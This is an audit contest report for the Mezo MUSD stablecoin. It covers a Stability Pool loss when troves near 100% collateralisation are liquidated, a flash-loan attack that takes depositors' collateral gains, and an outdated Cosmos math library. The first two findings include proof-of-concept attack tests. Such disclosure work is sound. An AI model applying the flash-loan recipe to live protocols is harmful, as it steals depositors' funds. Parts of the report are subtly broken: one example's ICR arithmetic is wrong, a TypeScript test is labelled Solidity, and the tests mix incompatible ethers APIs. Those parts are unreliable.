## Mezo
[Contest details](https://cantina.xyz/code/e757364c-1f68-4ec5-94f6-c6b3c2e80c6d/README.md)

### [Medium-01] Liquidated Troves with ICR slightly above 100% will cause a loss of funds to the Stability Pool

#### Summary
In the MUSD system (aligned with Liquity V2 mechanics), liquidating a trove with an Individual Collateralization Ratio (ICR) between 100% and 100.5% results in a loss to the Stability Pool. This occurs because the collateral gas compensation reduces the effective collateral below the debt amount, despite the trove initially appearing to have sufficient collateral to cover its debt.

#### Finding Description
When a trove’s ICR falls below the Minimum Collateralization Ratio (MCR, typically 110%) but remains above 100%, the liquidation process uses the Stability Pool to offset the trove’s debt. During liquidation, a gas compensation (e.g., 0.5% of the trove’s collateral) is deducted and sent to the liquidator. For troves with an ICR slightly above 100% (e.g., 100.5%), this deduction can cause the remaining collateral to fall short of the debt, forcing the Stability Pool to absorb the shortfall. This behavior contradicts the intended design, where the Stability Pool should only offset debt when the collateral fully covers it, and debt redistribution within the TroveManager should handle undercollateralized cases (ICR < 100%).

#### Attack Path
A trove is created with an ICR slightly above 100% (e.g., collateral = 2 WETH, debt = 2000 MUSD, price = 1000 USD/WETH, ICR = 100.5%).
The ICR drops below MCR (110%) due to a price decrease, triggering liquidation.
Since the ICR is still above 100%, the Stability Pool offsets the debt.
Gas compensation (e.g., 0.01 WETH) is deducted from the collateral.
Post-compensation, the remaining collateral (1.99 WETH = 1990 USD) is less than the debt (2000 MUSD), creating a shortfall (10 MUSD).
The Stability Pool absorbs this shortfall, resulting in a loss for depositors.
This issue arises naturally during market price fluctuations and requires no malicious intent.

#### Impact Explanation
Stability Pool depositors suffer losses as their MUSD deposits are burned to cover the shortfall, while the received collateral is insufficient. Repeated losses could undermine confidence in the MUSD protocol, deterring depositors from using the Stability Pool.

#### Likelihood Explanation
The bug manifests in a narrow ICR range (100% to 100.5%), but this range is plausible during market volatility, especially with large troves. Liquidations in DeFi are common during price drops, increasing the likelihood of this scenario.

#### Proof of Concept
```solidity
describe("Stability Pool Loss Due to Gas Compensation", () => {
  let alice: User;
  let bob: User;
  let contracts: Contracts;
  let addresses: TestingAddresses;
  let troveManager: TroveManager;
  let borrowerOperations: BorrowerOperations;
  let stabilityPool: StabilityPool;
  let priceFeed: PriceFeed;

  beforeEach(async () => {
    ({ alice, bob, contracts, addresses } = await setupTests());
    troveManager = contracts.troveManager;
    borrowerOperations = contracts.borrowerOperations;
    stabilityPool = contracts.stabilityPool;
    priceFeed = contracts.priceFeed;

    // Mint MUSD for testing
    await contracts.musd.unprotectedMint(alice.wallet, to1e18(2000));
    await contracts.musd.unprotectedMint(bob.wallet, to1e18(5000));
  });

  it("causes loss to Stability Pool when liquidating trove with ICR between 100% and 100.5%", async () => {
    // Step 1: Open a trove with ICR ~164% at opening
    const initialPrice = to1e18(1100); // $1100 USD per WETH
    await priceFeed.setPrice(initialPrice);

    const collAmount = ethers.parseEther("3"); // 3 WETH
    const debtAmount = to1e18(2000); // 2000 MUSD
    await borrowerOperations.connect(alice.wallet).openTrove(
      0,
      debtAmount,
      ethers.ZeroAddress,
      ethers.ZeroAddress,
      { value: collAmount }
    );

    // Verify initial ICR
    const initialICR = await troveManager.getCurrentICR(alice.wallet, initialPrice);
    expect(initialICR).to.be.gt(to1e18(110), "Initial ICR should be above MCR");

    // Step 2: Deposit to Stability Pool
    await stabilityPool.connect(bob.wallet).provideToSP(to1e18(5000));

    // Step 3: Drop price to reduce ICR to ~100.3%
    const finalPrice = to1e18(670); // ~$670 USD per WETH
    await priceFeed.setPrice(finalPrice);

    // Verify ICR after price drop
    const icr = await troveManager.getCurrentICR(alice.wallet, finalPrice);
    expect(icr).to.be.lt(to1e18(110), "ICR should be below MCR");
    expect(icr).to.be.gt(to1e18(1), "ICR should be above 100%");
    expect(icr).to.be.lt(to1e18(1.005), "ICR should be below 100.5%");

    // Step 4: Liquidate the trove
    const spMUSDBefore = await stabilityPool.getTotalMUSDDeposits();
    const spCollBefore = await stabilityPool.getCollBalance();

    await troveManager.liquidate(alice.wallet);

    // Step 5: Verify Stability Pool loss
    const spMUSDAfter = await stabilityPool.getTotalMUSDDeposits();
    const spCollAfter = await stabilityPool.getCollBalance();

    const collFromLiquidation = spCollAfter.sub(spCollBefore);
    const musdOffset = spMUSDBefore.sub(spMUSDAfter);

    expect(musdOffset).to.be.closeTo(to1e18(2000), to1e18(1), "Unexpected MUSD reduction in SP");
    expect(collFromLiquidation.mul(finalPrice).div(to1e18(1))).to.be.lt(musdOffset, "Stability Pool incurs a loss");
  });
});
```

#### Recommendation
To mitigate this vulnerability, modify the liquidation logic in the `TroveManager` contract to avoid using the Stability Pool when the post-compensation ICR would fall below 100%


### [Medium-02] Flash Loan Attack on Stability Pool Allowing Collateral Gain Theft

#### Summary
The MUSD Stability Pool contract contains a vulnerability that enables a flash loan attack, allowing an attacker to steal collateral gains (e.g., WETH) intended for long-term depositors. By leveraging a flash loan to deposit a large amount of MUSD, triggering liquidations, and withdrawing immediately, the attacker can claim a disproportionate share of rewards, undermining the protocol's fairness and stability.

#### Finding Description
The MUSD Stability Pool contract contains a vulnerability that enables a flash loan attack, allowing an attacker to steal collateral gains (e.g., WETH) intended for long-term depositors. By leveraging a flash loan to deposit a large amount of MUSD, triggering liquidations, and withdrawing immediately, the attacker can claim a disproportionate share of rewards, undermining the protocol's fairness and stability.

The Stability Pool is designed to hold MUSD deposits to absorb liquidated trove debt and distribute collateral gains proportionally to depositors based on their sustained liquidity provision. However, the lack of a timelock or minimum deposit duration enables the following attack:

- Borrow WETH via a flash loan (e.g., from Balancer).
- Swap WETH for MUSD and deposit it into the Stability Pool using `provideToSP`.
- Trigger Liquidations of undercollateralized troves with `TroveManager.batchLiquidateTroves`, burning MUSD and adding collateral to the pool.
- Withdraw Immediately via `withdrawFromSP`, claiming collateral gains based on the temporary deposit.
- Repay the Flash Loan and retain the excess collateral as profit.
This exploit undermines the protocol’s intent to reward long-term depositors by allowing short-term deposits to siphon liquidation gains.

#### Impact Explanation
- Loss of Rewards: Legitimate depositors lose significant collateral. For example, a depositor’s gains might drop from ~5.55 WETH to ~1.85 WETH.
- Reduced Participation: Stolen rewards deter users from depositing, weakening the Stability Pool.
- Peg Risk: Insufficient deposits during market stress could impair liquidation capacity, threatening MUSD’s $1 peg.

#### Likelihood Explanation
Requires troves with ICR < 110%, common during volatility (e.g., ETH price drop from 2,000 to 1,950).

#### Proof of Concept
A test demonstrates the attack:
```typescript
describe("Flash Loan Attack on MUSD Stability Pool", () => {
  let alice: User;
  let bob: User;
  let carol: User;
  let attacker: User;
  let contracts: Contracts;
  let addresses: TestingAddresses;
  let troveManager: TroveManager;
  let borrowerOperations: BorrowerOperations;
  let stabilityPool: StabilityPool;

  beforeEach(async () => {
    ({ alice, bob, carol, attacker, contracts, addresses } = await setupTests());
    troveManager = contracts.troveManager;
    borrowerOperations = contracts.borrowerOperations;
    stabilityPool = contracts.stabilityPool;

    // Mint MUSD for testing
    await contracts.musd.unprotectedMint(alice.wallet, to1e18(10_000_000));
    await contracts.musd.unprotectedMint(bob.wallet, to1e18(10_000));
    await contracts.musd.unprotectedMint(carol.wallet, to1e18(10_000));
    await contracts.musd.unprotectedMint(attacker.wallet, to1e18(20_000_000)); // Mock flash loan
  });

  it("demonstrates flash loan attack on Stability Pool", async () => {
    // Alice deposits 10M MUSD to Stability Pool
    await stabilityPool.connect(alice.wallet).provideToSP(to1e18(10_000_000));

    // Bob opens a trove: 100 ETH collateral, 5000 MUSD debt
    const bobCollateral = ethers.parseEther("100");
    const bobDebt = to1e18(5000);
    await borrowerOperations
      .connect(bob.wallet)
      .openTrove(0, bobDebt, ethers.ZeroAddress, ethers.ZeroAddress, { value: bobCollateral });

    // Carol opens a trove: 5.55 ETH collateral, 10,000 MUSD debt
    const carolCollateral = ethers.parseEther("5.55");
    const carolDebt = to1e18(10_000);
    await borrowerOperations
      .connect(carol.wallet)
      .openTrove(0, carolDebt, ethers.ZeroAddress, ethers.ZeroAddress, { value: carolCollateral });

    // Simulate ETH price drop to make Carol's trove liquidatable
    await contracts.priceFeed.setPrice(1950e18); // ETH price drops to $1950

    // Attacker deposits 20M MUSD (mocked flash loan)
    await stabilityPool.connect(attacker.wallet).provideToSP(to1e18(20_000_000));

    // Liquidate Carol's trove
    const trovesToLiquidate = [carol.wallet];
    await troveManager.batchLiquidateTroves(trovesToLiquidate);

    // Attacker withdraws immediately
    await stabilityPool.connect(attacker.wallet).withdrawFromSP(to1e18(20_000_000));

    // Verify attacker's collateral gain
    const attackerCollGain = await stabilityPool.getDepositorCollGain(attacker.wallet);
    expect(attackerCollGain).to.be.gt(0, "Attacker should have gained collateral");

    // Verify Alice's reduced collateral gain
    const aliceCollGain = await stabilityPool.getDepositorCollGain(alice.wallet);
    expect(aliceCollGain).to.be.lt(to1e18(5.55), "Alice's gain should be reduced");
  });
});
```

#### Recommendation
To prevent the flash loan attack, add a timelock to `withdrawFromSP`, requiring deposits to remain in the Stability Pool for a minimum duration before withdrawal. This ensures depositors contribute long-term liquidity, negating the advantage of flash loans.



### [Medium-03] ASA-2024-010: cosmossdk.io/math: Mismatched bit-length validation in sdk.Int and sdk.Dec can lead to panic

#### Finding Description
The protocol is using an outdated version of the `cosmossdk.io/math` (v1.3.0), which contains a critical vulnerability. This flaw (`ASA-2024-010`) may present a possible panic condition when interacting with `Dec` types in an Intcontext.

#### Impact Explanation
May present a possible panic condition when interacting with `Dec` types in an Int context.

#### Root Cause
Usage of `cosmossdk.io/math` (v1.3.0)

#### Recommendation
Upgrade to the latest patched version of the `cosmossdk.io/math`: v1.4.0
